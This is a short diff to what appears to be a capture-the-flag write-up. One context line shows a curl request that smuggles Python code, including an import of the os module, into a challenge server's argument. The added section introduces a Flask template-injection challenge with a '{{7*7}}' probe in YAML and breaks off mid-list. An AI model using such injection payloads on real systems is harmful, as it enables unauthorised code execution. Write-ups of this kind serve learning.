@@ -75,4 +75,18 @@ curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\')
 
 ----------------
 
+### Flask ain't no Markup Language
 
+---------------
+
+<img width="496" height="747" alt="image" src="https://github.com/user-attachments/assets/5fa6bf38-41f2-42f1-9866-0447c27c6504" />
+
+---------------
+
+- Vulnerability is Flask Server Side Template Injection in `yaml`.While executing it, our payload will be place in yaml syntax e.g
+
+```yaml
+x: "{{7*7}}"
+```
+
+- 
